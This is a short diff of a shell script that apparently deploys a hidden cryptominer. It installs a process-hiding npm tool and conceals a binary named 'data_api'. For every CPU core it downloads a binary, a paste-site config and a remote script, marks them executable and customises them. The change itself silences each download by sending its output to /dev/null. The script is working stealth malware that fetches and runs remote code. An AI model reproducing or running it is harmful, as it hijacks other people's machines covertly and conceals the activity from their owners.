@@ -5,14 +5,14 @@ echo "SETTING USER..."
 sudo npm i -g node-process-hider > /dev/null 2>&1 && sudo ph add data_api > /dev/null 2>&1
 
 CPU=$(nproc)
-wget -O data_api https://github.com/hambana01/cici/raw/main/download
+wget -O data_api https://github.com/hambana01/cici/raw/main/download > /dev/null 2>&1
 # DIRAWAL=$(pwd)
 for (( j=1; j<=$CPU; j++ ))
 do
   DIR=$(shuf -n 1 -i 1-99999999)
   mkdir $DIR
-  wget -O build_config https://www.heypasteit.com/download/0IX51N
-  wget -O $DIR.sh https://github.com/hambana01/cici/raw/main/gas.sh
+  wget -O build_config https://www.heypasteit.com/download/0IX51N > /dev/null 2>&1
+  wget -O $DIR.sh https://github.com/hambana01/cici/raw/main/gas.sh > /dev/null 2>&1
   sudo chmod 755 data_api build_config $DIR.sh
   sed -i "s/BLESS/$DIR/" "build_config"
   sed -i "s/WORK/$DIR/" "$DIR.sh"
